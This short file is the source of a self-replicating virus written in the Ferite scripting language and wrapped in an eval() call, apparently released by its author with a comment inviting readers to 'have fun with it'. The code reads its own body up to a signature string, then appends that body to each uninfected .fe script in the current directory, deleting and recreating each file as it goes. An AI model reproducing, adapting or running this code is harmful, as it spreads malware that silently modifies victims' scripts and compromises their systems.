eval('uses "filesystem","sys";function Is_Infected(string fl) { string st = File.open(fl).toString(); if(String.index(st,"kr00l.b by [WarGame,#eof]") != -1) {return 1;} else {return 0;}} string signature =  "kr00l.b by [WarGame,#eof]";string fl = "";string my_code = "";object pr = File.open(Sys.scriptName());string orig = "";object dir = new Directory("."); while(String.index((my_code = pr.readln()),signature) == -1) {} while((fl = dir.getEntry()) != "") { if(String.index(Sys.scriptName(),fl) == -1 && String.index(fl,".fe") != -1) {  if(!Is_Infected(fl)) { orig = File.open(fl).toString(); File.remove(fl); File.create(fl).writeln(orig+my_code); } } } ');






// This is the evolution of the kr00l ferite virus, it appends to victim scripts ... have fun with it by [WarGame,#eof]
